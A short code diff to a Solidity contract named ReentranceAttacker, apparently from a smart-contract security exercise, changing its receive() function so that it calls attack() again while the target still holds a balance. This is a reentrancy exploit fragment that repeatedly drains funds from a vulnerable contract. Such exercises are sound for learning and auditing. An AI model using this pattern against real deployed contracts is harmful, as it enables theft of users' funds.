@@ -31,8 +31,7 @@ contract ReentranceAttacker {
 
     receive() external payable {
         if (address(target).balance > 0) {
-            uint256 balance = target.balanceOf(address(this));
-            target.withdraw(balance);
+            attack();
         }
     }
 }
